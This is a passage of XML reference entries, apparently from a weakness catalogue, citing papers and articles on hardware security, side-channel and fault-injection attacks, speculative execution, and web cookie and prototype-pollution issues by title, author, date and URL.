			<ns0:Author>Anil Sabbavarapu</ns0:Author>
			<ns0:Title>Design for Testability &amp; Design for Debug</ns0:Title>
			<ns0:URL>http://users.ece.utexas.edu/~mcdermot/vlsi-2/Lecture_17.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1086">
			<ns0:Author>Fan Wang</ns0:Author>
			<ns0:Author>Vishwani D. Agrawal</ns0:Author>
			<ns0:Title>Single Event Upset: An Embedded Tutorial</ns0:Title>
			<ns0:URL>https://www.eng.auburn.edu/~agrawvd/TALKS/tutorial_6pg.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1087">
			<ns0:Author>P. D. Bradley</ns0:Author>
			<ns0:Author>E. Normand</ns0:Author>
			<ns0:Title>Single Event Upsets in Implantable Cardioverter Defibrillators</ns0:Title>
			<ns0:URL>https://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=736549&amp;tag=1</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1088">
			<ns0:Author>Melanie Berg</ns0:Author>
			<ns0:Author>Kenneth LaBel</ns0:Author>
			<ns0:Author>Jonathan Pellish</ns0:Author>
			<ns0:Title>Single Event Effects in FPGA Devices 2015-2016</ns0:Title>
			<ns0:URL>https://ntrs.nasa.gov/search.jsp?R=20160007754</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1089">
			<ns0:Author>Cisco</ns0:Author>
			<ns0:Title>Cisco 12000 Single Event Upset Failures Overview and Work Around Summary</ns0:Title>
			<ns0:URL>https://www.cisco.com/c/en/us/support/docs/field-notices/200/fn25994.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1090">
			<ns0:Author>Cypress</ns0:Author>
			<ns0:Title>Different Ways to Mitigate Soft Errors in Asynchronous SRAMs - KBA90939</ns0:Title>
			<ns0:URL>https://community.infineon.com/t5/Knowledge-Base-Articles/Different-Ways-to-Mitigate-Soft-Errors-in-Asynchronous-SRAMs-KBA90939/ta-p/257944</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1091">
			<ns0:Author>Ian Johnston</ns0:Author>
			<ns0:Title>Cosmic particles can change elections and cause plans to fall through the sky, scientists warn</ns0:Title>
			<ns0:URL>https://www.independent.co.uk/news/science/subatomic-particles-cosmic-rays-computers-change-elections-planes-autopilot-a7584616.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1092">
			<ns0:Author>Shahed E. Quadir</ns0:Author>
			<ns0:Author>Junlin Chen</ns0:Author>
			<ns0:Author>Domenic Forte</ns0:Author>
			<ns0:Author>Navid Asadizanjani</ns0:Author>
			<ns0:Author>Sina Shahbazmohamadi</ns0:Author>
			<ns0:Author>Lei Wang</ns0:Author>
			<ns0:Author>John Chandy</ns0:Author>
			<ns0:Author>Mark Tehranipoor</ns0:Author>
			<ns0:Title>A Survey on Chip to System Reverse Engineering</ns0:Title>
			<ns0:URL>https://dl.acm.org/doi/pdf/10.1145/2755563</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1093">
			<ns0:Author>Brandon Hill</ns0:Author>
			<ns0:Title>Huge Intel CPU Bug Allegedly Causes Kernel Memory Vulnerability With Up To 30% Performance Hit In Windows And Linux</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---02</ns0:Publication_Day>
			<ns0:URL>https://hothardware.com/news/intel-cpu-bug-kernel-memory-isolation-linux-windows-macos</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1094">
			<ns0:Author>Christopher Domas</ns0:Author>
			<ns0:Title>Breaking the x86 ISA</ns0:Title>
			<ns0:URL>https://github.com/xoreaxeaxeax/sandsifter/blob/master/references/domas_breaking_the_x86_isa_wp.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1095">
			<ns0:Author>Matthew Hughes</ns0:Author>
			<ns0:Title>Bad news: KeyWe Smart Lock is easily bypassed and can't be fixed</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---11</ns0:Publication_Day>
			<ns0:URL>https://www.theregister.com/2019/12/11/f_secure_keywe/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1096">
			<ns0:Author>Alex Scroxton</ns0:Author>
			<ns0:Title>Alarm bells ring, the IoT is listening</ns0:Title>
			<ns0:URL>https://www.computerweekly.com/news/252475324/Alarm-bells-ring-the-IoT-is-listening</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1097">
			<ns0:Author>Brian Krebs</ns0:Author>
			<ns0:Title>Zyxel Flaw Powers New Mirai IoT Botnet Strain</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---20</ns0:Publication_Day>
			<ns0:URL>https://krebsonsecurity.com/2020/03/zxyel-flaw-powers-new-mirai-iot-botnet-strain/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1098">
			<ns0:Author>Jack Tang</ns0:Author>
			<ns0:Title>Root Cause Analysis of CVE-2014-1772 - An Internet Explorer Use After Free Vulnerability</ns0:Title>
			<ns0:Publication_Year>2014</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---05</ns0:Publication_Day>
			<ns0:URL>https://www.trendmicro.com/en_us/research.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1099">
			<ns0:Author>Simon Zuckerbraun</ns0:Author>
			<ns0:Title>It's Time To Terminate The Terminator</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---15</ns0:Publication_Day>
			<ns0:URL>https://www.zerodayinitiative.com/blog/2018/5/15/its-time-to-terminate-the-terminator</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1100">
			<ns0:Author>Christopher Domas</ns0:Author>
			<ns0:Title>The Memory Sinkhole</ns0:Title>
			<ns0:Publication_Year>2015</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---20</ns0:Publication_Day>
			<ns0:URL>https://github.com/xoreaxeaxeax/sinkhole/blob/master/us-15-Domas-TheMemorySinkhole-wp.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1101">
			<ns0:Author>Anders B. Wilhelmsen</ns0:Author>
			<ns0:Author>Eivind S. Kristiansen</ns0:Author>
			<ns0:Author>Marie Moe</ns0:Author>
			<ns0:Title>The Hard-coded Key to my Heart - Hacking a Pacemaker Programmer</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---10</ns0:Publication_Day>
			<ns0:URL>https://anderbw.github.io/2019-08-10-DC27-Biohacking-pacemaker-programmer.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1103">
			<ns0:Author>Lucian Armasu</ns0:Author>
			<ns0:Title>Intel ME's Undocumented Manufacturing Mode Suggests CPU Hacking Risks</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---03</ns0:Publication_Day>
			<ns0:URL>https://www.tomshardware.com/news/intel-me-cpu-undocumented-manufacturing-mode,37883.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1104">
			<ns0:Author>M. West</ns0:Author>
			<ns0:Author>M. Goodwin</ns0:Author>
			<ns0:Title>SameSite attribute specification draft</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:Publication_Day>---06</ns0:Publication_Day>
			<ns0:URL>https://datatracker.ietf.org/doc/html/draft-west-first-party-cookies-07</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1105">
			<ns0:Author>Mozilla</ns0:Author>
			<ns0:Title>SameSite attribute description on MDN Web Docs</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---20</ns0:Publication_Day>
			<ns0:URL>https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1106">
			<ns0:Author>The Chromium Projects</ns0:Author>
			<ns0:Title>Chromium support for SameSite attribute</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---26</ns0:Publication_Day>
			<ns0:URL>https://www.chromium.org/updates/same-site/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1107">
			<ns0:Author>Intel Corporation</ns0:Author>
			<ns0:Title>PCIe Device Measurement Requirements</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:URL>https://www.intel.com/content/dam/www/public/us/en/documents/reference-guides/pcie-device-security-enhancements.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1108">
			<ns0:Author>Intel Corporation</ns0:Author>
			<ns0:Title>Deep Dive: Retpoline: A Branch Target Injection Mitigation</ns0:Title>
			<ns0:URL>https://www.intel.com/content/www/us/en/developer/topic-technology/software-security-guidance/overview.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1109">
			<ns0:Title>LANGSEC: Language-theoretic Security</ns0:Title>
			<ns0:URL>http://langsec.org/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1110">
			<ns0:Title>LangSec: Recognition, Validation, and Compositional Correctness for Real World Security</ns0:Title>
			<ns0:URL>http://langsec.org/bof-handout.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1111">
			<ns0:Author>Sergey Bratus</ns0:Author>
			<ns0:Author>Lars Hermerschmidt</ns0:Author>
			<ns0:Author>Sven M. Hallberg</ns0:Author>
			<ns0:Author>Michael E. Locasto</ns0:Author>
			<ns0:Author>Falcon D. Momot</ns0:Author>
			<ns0:Author>Meredith L. Patterson</ns0:Author>
			<ns0:Author>Anna Shubina</ns0:Author>
			<ns0:Title>Curing the Vulnerable Parser: Design Patterns for Secure Input Handling</ns0:Title>
			<ns0:Publication>USENIX ;login:</ns0:Publication>
			<ns0:Publication_Year>2017</ns0:Publication_Year>
			<ns0:URL>https://www.usenix.org/system/files/login/articles/login_spring17_08_bratus.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1112">
			<ns0:Title>Android Security Bulletin - December 2018</ns0:Title>
			<ns0:URL>https://source.android.com/security/bulletin/2018-12-01.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1113">
			<ns0:Author>Muhammad Yasin</ns0:Author>
			<ns0:Author>Abhrajit  Sengupta</ns0:Author>
			<ns0:Author>Mohammed Thari Nabeel</ns0:Author>
			<ns0:Author>Mohammed  Ashraf</ns0:Author>
			<ns0:Author>Jeyavijayan (JV) Rajendran</ns0:Author>
			<ns0:Author>Ozgur  Sinanoglu</ns0:Author>
			<ns0:Title>Provably-Secure Logic Locking: From Theory To Practice</ns0:Title>
			<ns0:URL>https://dl.acm.org/doi/10.1145/3133956.3133985</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1114">
			<ns0:Author>Muhammad Yasin</ns0:Author>
			<ns0:Author>Jeyavijayan (JV) Rajendran</ns0:Author>
			<ns0:Author>Ozgur  Sinanoglu</ns0:Author>
			<ns0:Title>Trustworthy Hardware Design: Combinational Logic Locking Techniques</ns0:Title>
			<ns0:URL>https://link.springer.com/book/10.1007/978-3-030-15334-2</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1115">
			<ns0:Author>Meher Krishna Patel</ns0:Author>
			<ns0:Title>FPGA designs with Verilog (section 7.4 Glitches)</ns0:Title>
			<ns0:URL>https://verilogguide.readthedocs.io/en/latest/verilog/fsm.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1116">
			<ns0:Author>Clifford E. Cummings</ns0:Author>
			<ns0:Title>Non-Blocking Assignments in Verilog Synthesis, Coding Styles that Kill!</ns0:Title>
			<ns0:Publication_Year>2000</ns0:Publication_Year>
			<ns0:URL>http://www.sunburst-design.com/papers/CummingsSNUG2000SJ_NBA.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1117">
			<ns0:Author>Paul Kocher</ns0:Author>
			<ns0:Author>Joshua Jaffe</ns0:Author>
			<ns0:Author>Benjamin Jun</ns0:Author>
			<ns0:Title>Introduction to differential power analysis and related attacks</ns0:Title>
			<ns0:Publication_Year>1998</ns0:Publication_Year>
			<ns0:URL>https://www.rambus.com/wp-content/uploads/2015/08/DPATechInfo.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1118">
			<ns0:Author>Dakshi Agrawal</ns0:Author>
			<ns0:Author>Bruce Archambeault</ns0:Author>
			<ns0:Author>Josyula R. Rao</ns0:Author>
			<ns0:Author>Pankaj Rohatgi</ns0:Author>
			<ns0:Title>The EM Side-Channel(s)</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---24</ns0:Publication_Day>
			<ns0:URL>https://link.springer.com/content/pdf/10.1007/3-540-36400-5_4.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1119">
			<ns0:Author>Daniel Genkin</ns0:Author>
			<ns0:Author>Adi Shamir</ns0:Author>
			<ns0:Author>Eran Tromer</ns0:Author>
			<ns0:Title>RSA key extraction via low-bandwidth acoustic cryptanalysis</ns0:Title>
			<ns0:Publication_Year>2014</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---13</ns0:Publication_Day>
			<ns0:URL>https://www.iacr.org/archive/crypto2014/86160149/86160149.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1120">
			<ns0:Author>Colin O'Flynn</ns0:Author>
			<ns0:Title>Power Analysis for Cheapskates</ns0:Title>
			<ns0:Publication_Year>2013</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---24</ns0:Publication_Day>
			<ns0:URL>https://media.blackhat.com/eu-13/briefings/OFlynn/bh-eu-13-for-cheapstakes-oflynn-wp.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1121">
			<ns0:Author>Moritz Lipp</ns0:Author>
			<ns0:Author>Michael Schwarz</ns0:Author>
			<ns0:Author>Daniel Gruss</ns0:Author>
			<ns0:Author>Thomas Prescher</ns0:Author>
			<ns0:Author>Werner Haas</ns0:Author>
			<ns0:Author>Anders Fogh</ns0:Author>
			<ns0:Author>Jann Horn</ns0:Author>
			<ns0:Author>Stegfan Mangard</ns0:Author>
			<ns0:Author>Paul Kocher</ns0:Author>
			<ns0:Author>Daniel Genkin</ns0:Author>
			<ns0:Author>Yuval Yarom</ns0:Author>
			<ns0:Author>Mike Hamberg</ns0:Author>
			<ns0:Title>Meltdown: Reading Kernel Memory from User Space</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---03</ns0:Publication_Day>
			<ns0:URL>https://meltdownattack.com/meltdown.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1122">
			<ns0:Author>Moritz Lipp</ns0:Author>
			<ns0:Author>Michael Schwarz</ns0:Author>
			<ns0:Author>Daniel Gruss</ns0:Author>
			<ns0:Author>Thomas Prescher</ns0:Author>
			<ns0:Author>Werner Haas</ns0:Author>
			<ns0:Author>Anders Fogh</ns0:Author>
			<ns0:Author>Jann Horn</ns0:Author>
			<ns0:Author>Stegfan Mangard</ns0:Author>
			<ns0:Author>Paul Kocher</ns0:Author>
			<ns0:Author>Daniel Genkin</ns0:Author>
			<ns0:Author>Yuval Yarom</ns0:Author>
			<ns0:Author>Mike Hamberg</ns0:Author>
			<ns0:Title>Spectre Attacks: Exploiting Speculative Execution</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---03</ns0:Publication_Day>
			<ns0:URL>https://spectreattack.com/spectre.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1123">
			<ns0:Author>Dmitry Evtyushkin</ns0:Author>
			<ns0:Author>Dmitry Ponomarev</ns0:Author>
			<ns0:Author>Nael Abu-Ghazaleh</ns0:Author>
			<ns0:Title>Jump Over ASLR: Attacking Branch Predictors to Bypass ASLR</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---19</ns0:Publication_Day>
			<ns0:URL>https://ieeexplore.ieee.org/abstract/document/7783743/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1124">
			<ns0:Author>Qian Ge</ns0:Author>
			<ns0:Author>Yuval Yarom</ns0:Author>
			<ns0:Author>David Cock</ns0:Author>
			<ns0:Author>Gernot Heiser</ns0:Author>
			<ns0:Title>A Survey of Microarchitectural Timing Attacks and Countermeasures on Contemporary Hardware</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---24</ns0:Publication_Day>
			<ns0:URL>https://eprint.iacr.org/2016/613.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1125">
			<ns0:Author>moparisthebest</ns0:Author>
			<ns0:Title>Validation Vulnerabilities</ns0:Title>
			<ns0:Publication_Year>2015</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---05</ns0:Publication_Day>
			<ns0:URL>https://mailarchive.ietf.org/arch/msg/acme/s6Q5PdJP48LEUwgzrVuw_XPKCsM/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1126">
			<ns0:Author>Josh Aas</ns0:Author>
			<ns0:Author>Daniel McCarney</ns0:Author>
			<ns0:Author>Roland Shoemaker</ns0:Author>
			<ns0:Title>Multi-Perspective Validation Improves Domain Validation Security</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---19</ns0:Publication_Day>
			<ns0:URL>https://letsencrypt.org/2020/02/19/multi-perspective-validation.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1127">
			<ns0:Author>Miguel Castro</ns0:Author>
			<ns0:Author>Barbara Liskov</ns0:Author>
			<ns0:Title>Practical Byzantine Fault Tolerance and Proactive Recovery</ns0:Title>
			<ns0:Publication_Year>2002</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---04</ns0:Publication_Day>
			<ns0:URL>https://dl.acm.org/doi/pdf/10.1145/571637.571640</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1129">
			<ns0:Author>Christopher Tarnovsky</ns0:Author>
			<ns0:Title>Security Failures In Secure Devices</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---21</ns0:Publication_Day>
			<ns0:URL>https://www.blackhat.com/presentations/bh-dc-08/Tarnovsky/Presentation/bh-dc-08-tarnovsky.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1130">
			<ns0:Author>Mark Ermolov, Positive Technologies</ns0:Author>
			<ns0:Title>Intel x86 Root of Trust: loss of trust</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---05</ns0:Publication_Day>
			<ns0:URL>https://blog.ptsecurity.com/2020/03/intelx86-root-of-trust-loss-of-trust.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1131">
			<ns0:Author>John Butterworth</ns0:Author>
			<ns0:Author>Cory Kallenberg</ns0:Author>
			<ns0:Author>Xeno Kovah</ns0:Author>
			<ns0:Title>BIOS Chronomancy: Fixing the Core Root of Trust for Measurement</ns0:Title>
			<ns0:Publication_Year>2013</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---31</ns0:Publication_Day>
			<ns0:URL>https://media.blackhat.com/us-13/US-13-Butterworth-BIOS-Security-Slides.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1134">
			<ns0:Author>Taku Izumi, Fujitsu Limited</ns0:Author>
			<ns0:Title>Address Range Memory Mirroring</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:URL>https://www.fujitsu.com/jp/documents/products/software/os/linux/catalog/LinuxConJapan2016-Izumi.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1135">
			<ns0:Author>Benoit Morgan, Eric Alata, Vincent Nicomette, Mohamed Kaaniche</ns0:Author>
			<ns0:Title>Bypassing IOMMU Protection against I/O Attacks</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:URL>https://hal.archives-ouvertes.fr/hal-01419962/document</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1136">
			<ns0:Author>Colin L. Rothwell</ns0:Author>
			<ns0:Title>Exploitation from malicious PCI Express peripherals</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:URL>https://www.cl.cam.ac.uk/techreports/UCAM-CL-TR-934.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1137">
			<ns0:Author>Yuriy Bulygin, Oleksandr Bazhaniuk, Andrew Furtak, John Loucaides, Mikhail Gorobets</ns0:Author>
			<ns0:Title>BARing the System - New vulnerabilities in Coreboot &amp; UEFI-based Systems</ns0:Title>
			<ns0:Publication_Year>2017</ns0:Publication_Year>
			<ns0:URL>https://www.c7zero.info/stuff/REConBrussels2017_BARing_the_system.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1138">
			<ns0:Author>Stewart Smith</ns0:Author>
			<ns0:Title>CVE-2019-6260: Gaining control of BMC from the host processor</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:URL>https://www.flamingspork.com/blog/2019/01/23/cve-2019-6260:-gaining-control-of-bmc-from-the-host-processor/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1139">
			<ns0:Author>ARM</ns0:Author>
			<ns0:Title>AMBA APB Protocol Specification, Version 2.0</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:URL>https://www.eecs.umich.edu/courses/eecs373/readings/IHI0024C_amba_apb_protocol_spec.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1140">
			<ns0:Author>OCP-IP</ns0:Author>
			<ns0:Title>Open Core Protocol Specification, Release 2.2</ns0:Title>
			<ns0:Publication_Year>2006</ns0:Publication_Year>
			<ns0:URL>http://read.pudn.com/downloads95/doc/388103/OCPSpecification%202.2.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1141">
			<ns0:Author>Marc Witteman</ns0:Author>
			<ns0:Title>Secure Application Programming in the presence of Side Channel Attacks</ns0:Title>
			<ns0:Publication_Year>2017</ns0:Publication_Year>
			<ns0:URL>https://riscureprodstorage.blob.core.windows.net/production/2017/08/Riscure_Whitepaper_Side_Channel_Patterns.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1142">
			<ns0:Author>A. Dehbaoui, J. M. Dutertre, B. Robisson, P. Orsatelli, P. Maurine, A. Tria</ns0:Author>
			<ns0:Title>Injection of transient faults using electromagnetic pulses. Practical results on a cryptographic system</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:URL>https://eprint.iacr.org/2012/123.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1143">
			<ns0:Author>A. Menu, S. Bhasin, J. M. Dutertre, J. B. Rigaud, J. Danger</ns0:Author>
			<ns0:Title>Precise Spatio-Temporal Electromagnetic Fault Injections on Data Transfers</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:URL>https://hal.telecom-paris.fr/hal-02338456/document</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1144">
			<ns0:Author>Colin O'Flynn</ns0:Author>
			<ns0:Title>BAM BAM!! On Reliability of EMFI for in-situ Automotive ECU Attacks</ns0:Title>
			<ns0:URL>https://eprint.iacr.org/2020/937.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1145">
			<ns0:Author>J. Balasch, D. Arum&#237;, S. Manich</ns0:Author>
			<ns0:Title>Design and Validation of a Platform for Electromagnetic Fault Injection</ns0:Title>
			<ns0:URL>https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=8311630</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1146">
			<ns0:Author>M. Gay, B. Karp, O. Keren, I. Polian</ns0:Author>
			<ns0:Title>Error control scheme for malicious and natural faults in cryptographic modules</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:URL>https://link.springer.com/content/pdf/10.1007/s13389-020-00234-7.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1147">
			<ns0:Author>M. L. Akkar, L. Goubin, O. Ly</ns0:Author>
			<ns0:Title>Automatic Integration of Counter-Measures Against Fault Injection Attacks</ns0:Title>
			<ns0:URL>https://www.labri.fr/perso/ly/publications/cfed.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1148">
			<ns0:Author>Olivier Arteau</ns0:Author>
			<ns0:Title>Prototype pollution attack in NodeJS application</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---15</ns0:Publication_Day>
			<ns0:URL>https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1149">
			<ns0:Author>Changhui Xu</ns0:Author>
			<ns0:Title>What is Prototype Pollution?</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---30</ns0:Publication_Day>
			<ns0:URL>https://codeburst.io/what-is-prototype-pollution-49482fc4b638</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1150">
			<ns0:Author>Jerry Backer</ns0:Author>
			<ns0:Author>David Hely</ns0:Author>
			<ns0:Author>Ramesh Karri</ns0:Author>
			<ns0:Title>Secure design-for-debug for Systems-on-Chip</ns0:Title>
			<ns0:Publication_Year>2015</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---06</ns0:Publication_Day>
			<ns0:URL>https://ieeexplore.ieee.org/document/7342418</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-1151">
			<ns0:Author>Jerry Backer</ns0:Author>
